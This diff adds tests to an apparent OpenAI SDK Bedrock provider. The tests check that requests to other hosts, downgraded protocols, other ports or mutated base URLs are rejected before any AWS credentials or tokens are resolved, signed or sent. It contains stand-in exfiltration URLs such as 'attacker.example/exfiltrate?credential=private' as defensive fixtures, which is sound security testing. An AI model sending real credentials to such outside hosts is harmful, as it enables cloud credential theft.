@@ -40,6 +40,78 @@ function jsonResponse(body: unknown = {}): Response {
   });
 }
 
+interface BedrockCredentialObservers {
+  baseURL: string;
+  tokenProvider: () => Promise<string>;
+  credentialProvider: () => Promise<{
+    accessKeyId: string;
+    secretAccessKey: string;
+    sessionToken: string;
+  }>;
+}
+
+const TRUSTED_BEDROCK_BASE_URL = 'https://bedrock.example.com/openai/v1';
+
+const BEDROCK_AUTHENTICATION_MODES: readonly (readonly [
+  string,
+  (options: BedrockCredentialObservers) => ReturnType<typeof bearerBedrock>,
+])[] = [
+  [
+    'dependency-free static bearer',
+    ({ baseURL }) => bearerBedrock({ region: 'us-east-1', baseURL, apiKey: 'static-bedrock-token' }),
+  ],
+  [
+    'dependency-free rotating bearer',
+    ({ baseURL, tokenProvider }) => bearerBedrock({ region: 'us-east-1', baseURL, tokenProvider }),
+  ],
+  [
+    'AWS static bearer',
+    ({ baseURL }) => bedrock({ region: 'us-east-1', baseURL, apiKey: 'static-bedrock-token' }),
+  ],
+  [
+    'AWS rotating bearer',
+    ({ baseURL, tokenProvider }) => bedrock({ region: 'us-east-1', baseURL, tokenProvider }),
+  ],
+  [
+    'AWS static SigV4 credentials',
+    ({ baseURL }) =>
+      bedrock({
+        region: 'us-east-1',
+        baseURL,
+        accessKeyId: 'static-access-key',
+        secretAccessKey: 'static-secret-key',
+        sessionToken: 'static-session-token',
+      }),
+  ],
+  [
+    'AWS rotating SigV4 credential provider',
+    ({ baseURL, credentialProvider }) => bedrock({ region: 'us-east-1', baseURL, credentialProvider }),
+  ],
+  ['AWS default credential chain', ({ baseURL }) => bedrock({ region: 'us-east-1', baseURL, apiKey: null })],
+];
+
+const CROSS_ORIGIN_BEDROCK_PATHS = [
+  ['different host', 'https://attacker.example/exfiltrate?credential=private'],
+  ['HTTP downgrade', 'http://bedrock.example.com/openai/v1/models?credential=private'],
+  ['different effective port', 'https://bedrock.example.com:8443/openai/v1/models?credential=private'],
+] as const;
+
+function trackedBedrockCredentials(baseURL = TRUSTED_BEDROCK_BASE_URL) {
+  process.env['AWS_ACCESS_KEY_ID'] = 'environment-access-key';
+  process.env['AWS_SECRET_ACCESS_KEY'] = 'environment-secret-key';
+  process.env['AWS_SESSION_TOKEN'] = 'environment-session-token';
+
+  return {
+    baseURL,
+    tokenProvider: vi.fn(async () => 'rotating-bedrock-token'),
+    credentialProvider: vi.fn(async () => ({
+      accessKeyId: 'provider-access-key',
+      secretAccessKey: 'provider-secret-key',
+      sessionToken: 'provider-session-token',
+    })),
+  };
+}
+
 describe('bedrock provider', () => {
   test('owns the Mantle endpoint and bearer authentication', async () => {
     let requestedURL: RequestInfo | undefined;
@@ -58,6 +130,224 @@ describe('bedrock provider', () => {
     expect(client.baseURL).toBe('https://bedrock-mantle.us-east-1.api.aws/openai/v1');
     expect(String(requestedURL)).toBe('https://bedrock-mantle.us-east-1.api.aws/openai/v1/models');
     expect(new Headers(requestedInit?.headers).get('authorization')).toBe('Bearer bedrock-token');
+  });
+
+  describe('request origin containment', () => {
+    test.each(
+      BEDROCK_AUTHENTICATION_MODES.flatMap(([mode, createProvider]) =>
+        CROSS_ORIGIN_BEDROCK_PATHS.map(([attack, path]) => [mode, attack, createProvider, path] as const),
+      ),
+    )(
+      'rejects %s with a %s before resolving credentials or sending',
+      async (_mode, _attack, create, path) => {
+        const credentials = trackedBedrockCredentials();
+        const fetch = vi.fn(async () => jsonResponse());
+        const sign = vi.spyOn(SignatureV4.prototype, 'sign');
+        const client = new OpenAI({ provider: create(credentials), fetch, maxRetries: 0 });
+
+        await expect(client.request({ method: 'get', path })).rejects.toThrow('Bedrock request origin');
+
+        expect(fetch).not.toHaveBeenCalled();
+        expect(credentials.tokenProvider).not.toHaveBeenCalled();
+        expect(credentials.credentialProvider).not.toHaveBeenCalled();
+        expect(sign).not.toHaveBeenCalled();
+      },
+    );
+
+    test.each(BEDROCK_AUTHENTICATION_MODES)(
+      'leaves the original request and headers untouched for cross-origin %s',
+      async (_mode, createProvider) => {
+        const credentials = trackedBedrockCredentials();
+        const sign = vi.spyOn(SignatureV4.prototype, 'sign');
+        const runtime = configureProvider(createProvider(credentials));
+        const originalHeaders = new Headers({
+          'x-amz-date': 'original-date',
+          'x-amz-security-token': 'original-session-token',
+          'x-request-marker': 'untouched',
+        });
+        const expectedHeaders = [...originalHeaders.entries()];
+        const request = {
+          method: 'post',
+          headers: originalHeaders,
+          redirect: 'follow',
+        } as any;
+
+        await expect(
+          runtime.prepareRequest!(request, {
+            url: 'https://attacker.example/exfiltrate?credential=private',
+            options: {} as any,
+          }),
+        ).rejects.toThrow('Bedrock request origin');
+
+        expect(request.headers).toBe(originalHeaders);
+        expect([...originalHeaders.entries()]).toEqual(expectedHeaders);
+        expect(request.method).toBe('post');
+        expect(request.redirect).toBe('follow');
+        expect(credentials.tokenProvider).not.toHaveBeenCalled();
+        expect(credentials.credentialProvider).not.toHaveBeenCalled();
+        expect(sign).not.toHaveBeenCalled();
+      },
+    );
+
+    test('reports only canonical origins without leaking URL credentials, paths, queries, or fragments', async () => {
+      const fetch = vi.fn(async () => jsonResponse());
+      const client = new OpenAI({
+        provider: bearerBedrock({ baseURL: TRUSTED_BEDROCK_BASE_URL, apiKey: 'bedrock-token' }),
+        fetch,
+      });
+      const requestError = await client
+        .request({
+          method: 'get',
+          path: 'https://embedded-user:embedded-password@attacker.example/exfiltrate/private?access_token=secret-query#secret-fragment',
+        })
+        .then(
+          () => null,
+          (error: unknown) => error,
+        );
+
+      expect(requestError).toBeInstanceOf(Error);
+      expect((requestError as Error).message).toContain('https://attacker.example');
+      expect((requestError as Error).message).toContain('https://bedrock.example.com');
+      expect((requestError as Error).message).not.toContain('embedded-user');
+      expect((requestError as Error).message).not.toContain('embedded-password');
+      expect((requestError as Error).message).not.toContain('/exfiltrate/private');
+      expect((requestError as Error).message).not.toContain('secret-query');
+      expect((requestError as Error).message).not.toContain('secret-fragment');
+      expect((requestError as Error).message).not.toContain('/openai/v1');
+      expect(fetch).not.toHaveBeenCalled();
+    });
+
+    test('rejects cross-origin requests before inspecting the default AWS credential chain', async () => {
+      const credentials = trackedBedrockCredentials();
+      const fetch = vi.fn(async () => jsonResponse());
+      const sign = vi.spyOn(SignatureV4.prototype, 'sign');
+      const client = new OpenAI({
+        provider: bedrock({ region: 'us-east-1', baseURL: credentials.baseURL, apiKey: null }),
+        fetch,
+        maxRetries: 0,
+      });
+      const credentialEnvironmentReads = vi.fn();
+      const environment = process.env;
+      process.env = new Proxy(environment, {
+        get(target, property, receiver) {
+          if (
+            property === 'AWS_ACCESS_KEY_ID' ||
+            property === 'AWS_SECRET_ACCESS_KEY' ||
+            property === 'AWS_SESSION_TOKEN'
+          ) {
+            credentialEnvironmentReads(property);
+          }
+          return Reflect.get(target, property, receiver);
+        },
+      });
+
+      await expect(
+        client.request({ method: 'get', path: 'https://attacker.example/exfiltrate' }),
+      ).rejects.toThrow('Bedrock request origin');
+
+      expect(credentialEnvironmentReads).not.toHaveBeenCalled();
+      expect(sign).not.toHaveBeenCalled();
+      expect(fetch).not.toHaveBeenCalled();
+    });
+
+    test.each(
+      BEDROCK_AUTHENTICATION_MODES.flatMap(([mode, createProvider]) =>
+        [
+          [
+            'a relative request on an arbitrary custom port',
+            'https://custom.gateway.internal:9443/openai/v1',
+            '/models',
+            'https://custom.gateway.internal:9443/openai/v1/models',
+          ],
+          [
+            'a same-origin absolute request outside the API base path',
+            'https://custom.gateway.internal:9443/openai/v1',
+            'https://CUSTOM.GATEWAY.INTERNAL:9443/another-api/models?view=summary',
+            'https://custom.gateway.internal:9443/another-api/models?view=summary',
+          ],
+          [
+            'an explicit default HTTPS port and uppercase hostname',
+            'https://BEDROCK.EXAMPLE.COM:443/openai/v1',
+            'https://bedrock.example.com:443/openai/v1/models',
+            'https://bedrock.example.com/openai/v1/models',
+          ],
+          [
+            'a configured HTTP endpoint with its implicit default port',
+            'http://bedrock.example.com:80/openai/v1',
+            'http://BEDROCK.EXAMPLE.COM/openai/v1/models',
+            'http://bedrock.example.com/openai/v1/models',
+          ],
+        ].map(
+          ([control, baseURL, path, expectedURL]) =>
+            [mode, control, createProvider, baseURL!, path!, expectedURL!] as const,
+        ),
+      ),
+    )('allows %s with %s', async (mode, _control, createProvider, baseURL, path, expectedURL) => {
+      const credentials = trackedBedrockCredentials(baseURL);
+      const fetch = vi.fn(async (_url: RequestInfo, _init?: RequestInit) => jsonResponse());
+      const client = new OpenAI({ provider: createProvider(credentials), fetch, maxRetries: 0 });
+
+      await client.request({ method: 'get', path });
+
+      expect(fetch).toHaveBeenCalledTimes(1);
+      expect(String(fetch.mock.calls[0]?.[0])).toBe(expectedURL);
+      expect(new Headers(fetch.mock.calls[0]?.[1]?.headers).get('authorization')).toBeTruthy();
+      expect(credentials.tokenProvider).toHaveBeenCalledTimes(mode.includes('rotating bearer') ? 1 : 0);
+      expect(credentials.credentialProvider).toHaveBeenCalledTimes(
+        mode.includes('credential provider') ? 1 : 0,
+      );
+    });
+
+    test.each([
+      ['original client', false],
+      ['cloned client', true],
+    ] as const)(
+      'keeps the configured provider origin after mutating the %s baseURL',
+      async (_name, clone) => {
+        const credentials = trackedBedrockCredentials();
+        const fetch = vi.fn(async () => jsonResponse());
+        const client = new OpenAI({
+          provider: bearerBedrock({
+            baseURL: credentials.baseURL,
+            tokenProvider: credentials.tokenProvider,
+          }),
+          fetch,
+          maxRetries: 0,
+        });
+        const requestClient = clone ? client.withOptions({ timeout: 1000 }) : client;
+        requestClient.baseURL = 'https://attacker.example/openai/v1';
+
+        await expect(requestClient.request({ method: 'get', path: '/exfiltrate' })).rejects.toThrow(
+          'Bedrock request origin',
+        );
+
+        expect(credentials.tokenProvider).not.toHaveBeenCalled();
+        expect(fetch).not.toHaveBeenCalled();
+      },
+    );
+
+    test.each(
+      BEDROCK_AUTHENTICATION_MODES.filter(([mode]) => /rotating bearer|credential provider/.test(mode)),
+    )('checks the final request origin again before a retry with %s', async (mode, createProvider) => {
+      const credentials = trackedBedrockCredentials();
+      const options = { method: 'get' as const, path: '/models', maxRetries: 1 };
+      const fetch = vi.fn(async () => {
+        options.path = 'https://attacker.example/exfiltrate';
+        return Response.json(
+          { error: { message: 'retry the request' } },
+          { status: 500, headers: { 'retry-after-ms': '1' } },
+        );
+      });
+      const client = new OpenAI({ provider: createProvider(credentials), fetch });
+
+      await expect(client.request(options)).rejects.toThrow('Bedrock request origin');
+
+      expect(fetch).toHaveBeenCalledTimes(1);
+      expect(credentials.tokenProvider).toHaveBeenCalledTimes(mode.includes('rotating bearer') ? 1 : 0);
+      expect(credentials.credentialProvider).toHaveBeenCalledTimes(
+        mode.includes('credential provider') ? 1 : 0,
+      );
+    });
   });
 
   test('keeps the environment bearer mode across withOptions and refreshes its value', async () => {
